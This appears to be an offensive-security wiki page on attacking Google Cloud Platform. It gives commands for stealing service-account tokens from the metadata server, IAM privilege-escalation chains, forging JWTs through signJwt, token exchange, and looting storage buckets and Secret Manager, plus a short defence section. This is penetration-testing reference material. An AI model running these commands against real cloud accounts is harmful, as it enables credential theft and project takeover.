---
title: "GCP Attacks"
type: technique
tags: [cloud, gcp, iam, service-account, metadata, privesc, exploitation]
phase: exploitation
date_created: 2026-06-16
date_updated: 2026-10-05
sources: [github-usestrix-strix]
---

## What it is

Attacking Google Cloud Platform: stealing and abusing service-account credentials, metadata-server token theft, IAM privilege escalation, and looting GCS/Secret Manager. Fills the GCP gap alongside [[aws-attacks]] and [[cloud-iam-attacks]].

## How it works

GCP identity is service-account-centric. Tokens are short-lived OAuth bearer tokens minted by the metadata server or `gcloud`. Most escalation is `iam.serviceAccounts.actAs` / token-generation chains: pivot from a low-priv identity to a higher-priv service account.

## Attack phases
Exploitation / post-exploitation (after foothold, SSRF, or leaked SA key).

## Prerequisites
- A credential: SA key JSON (`"type":"service_account"`), an OAuth token, `gcloud` session, or app-side SSRF to the metadata server.

## Methodology

### 1. Identify
```bash
gcloud auth list; gcloud config list; gcloud projects list
gcloud auth activate-service-account --key-file=sa.json    # if you have a key
```

### 2. Metadata server (SSRF or on-instance)
```bash
# Header is mandatory
curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes"
# Recursive dump (project SSH keys, attributes)
curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=text"
```
The token is the instance's service-account OAuth token -> use as `Authorization: Bearer`.

### 3. Enumerate permissions
```bash
gcloud projects get-iam-policy <proj> --format=json
# What can THIS identity do? (test without listing rights)
gcloud iam roles describe <role>
# automated:
git clone https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation; ./gcp_enum...
scoutsuite gcp --service-account sa.json
```

### 4. IAM privilege escalation (common chains)
- `iam.serviceAccounts.actAs` + `compute.instances.create` -> launch a VM as a higher-priv SA, read its token.
- `iam.serviceAccounts.getAccessToken` / `getOpenIdToken` -> mint a token for a privileged SA directly.
- `iam.serviceAccountKeys.create` -> persist by creating a new key for a target SA.
- `cloudfunctions.functions.create` + actAs / `deploymentmanager` / `cloudbuild` -> run code as the build/function SA (often Editor).
- `setIamPolicy` on a project/SA -> grant yourself `roles/owner`.

### 4b. Impersonation without keys (signJwt / signBlob / token exchange)
When org policy blocks SA key creation or you only hold `iam.serviceAccounts.signJwt`/`signBlob` on a target SA, you do not need a key: the IAM Credentials API signs AS that SA with YOUR token.
```bash
# Forge a JWT signed by the target SA (services that trust SA-signed JWTs accept it)
curl -s -X POST "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/TARGET_SA@proj.iam.gserviceaccount.com:signJwt" \
  -H "Authorization: Bearer <YOUR_token>" -H "Content-Type: application/json" \
  -d '{"payload":"{\"iss\":\"TARGET_SA@proj.iam.gserviceaccount.com\",\"aud\":\"https://SERVICE\",\"exp\":1799999999}"}'
# signBlob is the same call with :signBlob + b64 payload (request signing, HMAC-style trust)
```
Workload Identity Federation pivot: if you can read a federation config (`GET /projects/<n>/locations/global/workloadIdentityPools/.../providers/...`), the external-IdP trust may let you exchange ANY token from the trusted IdP for a GCP token:
```bash
curl -s -X POST "https://sts.googleapis.com/v1/token" \
  -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange&subject_token=<external-idp-token>&subject_token_type=urn:ietf:params:oauth:token-type:jwt&audience=<pool-provider-full-name>&scope=https://www.googleapis.com/auth/cloud-platform"
```
Check the pool's attribute conditions first; an empty/malformed condition is the finding.

### 4c. IAP-protected services
`roles/iap.httpsResourceAccessor` (or actAs on the backend SA) is the door; or forge the assertion when you can signJwt as the backend SA:
```bash
gcloud iap web get-iam-policy --project <proj>            # who may bypass
# decode the assertion a client must send:
# x-goog-iap-jwt-assertion header -> verify aud = client_id of the OAuth brand
curl -s -H "x-goog-iap-jwt-assertion: <jwt>" https://IAP_APP.appspot.com/
```

### 5. Loot
```bash
gsutil ls; gsutil cp -r gs://<bucket> .                  # GCS objects
gcloud secrets versions access latest --secret=<name>    # Secret Manager
gcloud compute instances list; gcloud sql instances list
```

## Bypasses and variants
- Org policy may block external keys; pivot via token generation instead of key creation.
- OS Login vs metadata SSH keys: add an SSH key to project/instance metadata for shell.
- Workload Identity (GKE): pod -> node SA -> metadata token; combine with [[kubernetes-attacks]].

## Detection and defence
Least-privilege SAs (no project Editor by default), disable SA key creation (org policy), restrict metadata via Workload Identity, Cloud Audit Logs alerting on `actAs`/`setIamPolicy`, VPC-SC around storage/secrets.

## Tools
`gcloud`, `gsutil`, ScoutSuite, GCP-IAM-Privilege-Escalation (Rhino), `enumerate-iam`-style scripts. SSRF entry -> [[wiki/payloads/ssrf]], payload [[imds-cloud-metadata]]. Drive with the `hunt-cloud` skill.

## GCS bucket checks without ambient credentials

`gsutil` can silently use ambient `gcloud` or application-default credentials and produce false
public-bucket verdicts. For anonymous checks, unset `GOOGLE_APPLICATION_CREDENTIALS` and use raw
unauthenticated HTTP. The 403/404 semantics match the S3 doctrine: 403 means the bucket exists but
is private, 404 means not found (or wrong name/region), and both URL forms must be tried:

```sh
curl -sI "https://storage.googleapis.com/<bucket>/" | head -1
curl -sI "https://<bucket>.storage.googleapis.com/" | head -1
```

IAM and ACL layers are independent: check `gsutil iam get <bucket>` AND the anonymous curl. A
bucket with uniform bucket-level access disabled plus a legacy ACL granting `public-read` is its
own misconfiguration class; neither check alone surfaces it.

## What to hunt in a listable bucket

- `terraform.tfstate`: every resource address, and frequently secrets in plaintext.
- `*.json` files shaped like service-account keys (`type: service_account`, `private_key`).

## Org and folder IAM inheritance gaps

Project-level deny policies may not apply at folder or org level, and a child project inherits
permissive folder IAM. Always resolve the effective policy through the org/folder hierarchy, not
just the project's own bindings.

## Scope downgrades, do not discard

A leaked service-account token restricted to `devstorage.read_only` on a single bucket is a
scoped-read finding, not a full-compromise claim. Record the scope the token actually carries.
The default compute service account follows the pattern
`PROJECT_NUMBER-compute@developer.gserviceaccount.com`; enumerate it even when no custom SA is
visible.

## Sources
